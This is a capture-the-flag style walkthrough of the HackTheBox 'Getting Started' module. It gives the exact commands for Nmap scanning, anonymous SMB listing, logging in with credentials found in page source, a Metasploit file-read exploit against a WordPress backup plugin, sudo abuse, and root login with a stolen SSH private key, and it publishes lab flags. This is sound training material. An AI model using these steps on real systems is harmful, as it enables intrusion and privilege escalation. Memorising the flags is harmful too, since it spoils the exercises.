---
title: "HackTheBox Module - Getting Started Walkthrough"
date: 2026-02-09 00:00:00 +0800
categories: [Pentesting, HackTheBox]
tags: [Pentesting, writeup, HackTheBox Penetration Tester Path, HackTheBox]
---

# Basic Tools

#### Question:
Apply what you learned in this section to grab the banner of the above server and submit it as the answer. 

### Solution
The command `nc` can be used to grab the banner of the given server:

```bash
$ nc <IP> <PORT> 
```
The result of the request is:
```shell-session
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

---


# Service Scanning

#### Question 1
Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080? 
#### Solution
Since the port number is provided, we can save time by scanning port 8080 directly using the `-p` flag. We also include the `-sV` option to identify the service and version information.
```bash
nmap -sV -p8080 <IP>
```
The result will show that the service on port 8080 is `Apache Tomcat`. 

#### Queation 2
Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on. 
#### Solution
Since the Telnet service is not running on its default port (23), a full port and service scan is required to locate it.

**Command used:**
```bash
nmap -sV -p- <IP>
```
The scan results confirm that the Telnet service is running on non-standard port `2323`.

#### Question 3
List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file. 
#### Soluetion
Nmap result:
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2323/tcp open  telnet      Linux telnetd
8080/tcp open  http        Apache Tomcat
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
```

Since SMB typically runs on port 445 and the scan indicates Samba is in use, we can list the available shares using the following command:
```bash
smbclient -N -L \\\\<IP>
```
Result:
```
Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
```
We can take a look at the share named `users` by using the following command:

```bash
# Password for the user bob: Welcome1
smbclient -U bob \\\\<IP>\users
```
**Note:** Use the credentials `bob:Welcome1` to authenticate.

Once the password is provided, the session is established. Use the `ls` command to list the available files and directories:

Result:
```
.                                   D        0  Fri Feb 26 00:06:52 2021
..                                  D        0  Thu Feb 25 21:05:31 2021
flag                                D        0  Fri Feb 26 00:09:26 2021
bob                                 D        0  Thu Feb 25 22:42:23 2021
```
Since `flag` is a directory, we navigate into it using the `cd flag` command. Finally, use `get flag.txt` to download the flag to the local working directory.

**Flag Content:**
```
dceece590f3284c3866305eb2473d099
```

---

# Web Enumeration
#### Question
```
 Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag. 
```

#### Solution
 Gemini said
Markdown

First, we visit the website in the browser:

![Landing Page](/assets/img/image.png)

The UI does not reveal any useful information, and inspecting the page source (`Ctrl+U`) yields no results. 

Next, we check for a `robots.txt` file at the root path (`/robots.txt`).



This reveals a hidden and interesting path:

```
User-agent: *
Disallow: /admin-login-page.php
```
Navigating directly to that page reveals an administrator login panel:

![alt text](/assets/img/image2.png)

Since we do not have valid credentials, we must look for further information. A logical first step is to inspect the page source:
```html
...
            <div class="container">
                <label for="username"><b>Username</b></label>
                <input name='username' placeholder='Username' type='text'>

                <label for="password"><b>Password</b></label>
                <input name='password' placeholder='Password' type='password'>

                <!-- TODO: remove test credentials admin:password123 -->

                <button type="submit" formmethod='post'>Login</button>
            </div>
...
```

The page source reveals test credentials that can be used to log in.

After successfully authenticating, the flag is displayed:
```
HTB{w3b_3num3r4710n_r3v34l5_53cr375}
```

---

# Public Exploits

#### Question
Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start) 

#### Solution
At first, we can try to enumerate the framework, application or web server with the tool whatweb:
```bash
whatweb <IP>:<PORT>
```
The scan result:
```
http://<IP>:<PORT> [200 OK] Apache[2.4.41], Country[UNITED STATES][US], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[154.57.164.79], MetaGenerator[WordPress 5.6.1], PoweredBy[--], Script, Title[Getting Started &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.6.1]
```
To gather more information, we visit the website's landing page, which indicates that **Simple Backup Plugin version 2.7.10** is in use on this WordPress site.

![alt text](/assets/img/image3.png)

Based on this information, we found a public exploit for an **Arbitrary File Download via Path Traversal** vulnerability: 
[https://www.exploit-db.com/exploits/51937](https://www.exploit-db.com/exploits/51937)

This exploit is also available within `msfconsole`:
```
# start metasploit
msfconsole

# search for the exploit
msf > search simple backup plugin

# choose the exploit
use auxiliary/scanner/http/wp_simple_backup_file_read

# set the remote host IP
set RHOSTS <TARGET_IP>

# set the remote port number
set RPORT <PORT>

# set the file name that we want to read 
set FILENAME /flag.txt

# excute the exploitation
exploit
```

The exploit module will automatically retrieve the flag and save it to the specified local directory.

```
HTB{my_f1r57_h4ck}
```


---

# Privilege Escalation

#### Question1
SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'. 

credential: `user1:password1`

#### Solution
At first, we have to connect to the specified IP and port as the user `user1` with the following command:
```bash
ssh user1@<IP> -p <PORT>
```

Then we can check quickly what commands we can use as which user by using the command `sudo -l`.

The result:
```
(user2 : user2) NOPASSWD: /bin/bash
```
It means that we are permitted to use `/bin/bash` as the user `user2`. 

As we can start a new bash shell with `/bin/bash`, we can combine it with `sudo`:
```bash
sudo -u user2 /bin/bash
```

Now, when we use the comamnd `whoami`, we can see that we successfully switched to user `user2`

So we can move to the directory `/home/user2` and read the flag.txt file.

The flag:
```
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
```

#### Question 2
Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'. 

#### Solution

As the user `user2`, lets inspect the permissions of the dir `/root` and all of the files/dirs within the dir:
```bash
ls -al /root/
```
Result:
```
# result:
total 20
drwxr-x---. 1 root user2   18 Feb 12  2021 .
drwxr-xr-x. 1 root root    40 Feb 20 17:01 ..
-rwxr-x---. 1 root user2    5 Aug 19  2020 .bash_history
-rwxr-x---. 1 root user2 3106 Dec  5  2019 .bashrc                      
-rwxr-x---. 1 root user2  161 Dec  5  2019 .profile                     
drwxr-x---. 1 root user2   20 Feb 12  2021 .ssh                        
-rwxr-x---. 1 root user2 1309 Aug 19  2020 .viminfo                    
-rw-------. 1 root root    33 Feb 12  2021 flag.txt
```

We have multiple permitssions on various files/directories. The most interesting is the directory `.ssh` which contains private and pubcli keys to connect to ssh.

Using `s -al ..ssh/` reveals that we have read access to id_rsa which is the private key. We can extract the key and store it on the local machine. 

Before logging in with the private key, we have to ensure that the file has strict permission:
```bash
chmod 600 id_rsa
```

Then we can log in as root!

```bash
ssh root@<IP> -p <PORT> -i ./id_rsa
```

The login is successful and we can read the file flag.txt

The flag:
```
HTB{pr1v1l363_35c4l4710n_2_r007}
```

---
